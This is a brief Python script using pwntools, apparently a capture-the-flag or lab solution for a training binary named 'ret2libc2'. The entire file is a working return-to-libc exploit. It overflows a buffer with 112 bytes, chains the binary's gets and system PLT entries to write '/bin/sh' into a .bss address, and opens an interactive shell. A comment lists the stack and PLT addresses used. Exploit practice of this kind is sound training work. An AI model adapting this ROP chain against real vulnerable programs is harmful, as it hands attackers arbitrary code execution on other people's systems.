from pwn import *

'''
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890
FFAF8DBC gets 0x8048460
FFAF8DB8 system 0x8048490
FFAF8DB0 0804A080
FFAF8DB4 0804A080
'''


def ret2_libc2_1(file_name='/mnt/hgfs/Cyber Security PWN/ROP/ret2libc2'):
    io = process([file_name])
    file_elf = ELF(file_name)
    system_plt = file_elf.plt['system']
    gets_plt = file_elf.plt['gets']
    bss_buf = 0x0804A080

    print(hex(file_elf.bss()))

    payload_1 = b'A' * 112 + p32(gets_plt) + p32(system_plt) + p32(bss_buf) + p32(bss_buf)
    io.sendline(payload_1)

    payload_2 = b'/bin/sh'
    io.sendline(payload_2)

    io.interactive()


if __name__ == '__main__':
    ret2_libc2_1()
